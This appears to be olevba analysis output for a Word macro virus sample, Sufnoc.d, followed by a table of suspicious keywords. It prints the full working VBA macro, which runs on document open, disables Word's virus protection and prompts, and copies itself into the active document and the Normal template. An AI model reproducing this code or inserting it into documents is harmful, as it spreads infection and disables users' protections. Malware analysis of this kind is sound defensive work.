olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sufnoc.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sufnoc.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Set A = Options
A.VirusProtection = 0
A.SaveNormalPrompt = 0
A.ConfirmConversions = 0
For B = 1 To 3
If B = 1 Then Set C = ThisDocument
If B = 2 Then Set C = ActiveDocument
If B = 3 Then Set C = NormalTemplate
Set D = C.VBProject.VBComponents.Item(1).CodeModule
If B = 1 Then E = D.Lines(1, D.CountOfLines)
If B <> 1 Then D.DeleteLines 1, D.CountOfLines
If B <> 1 Then D.Addfromstring E
Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

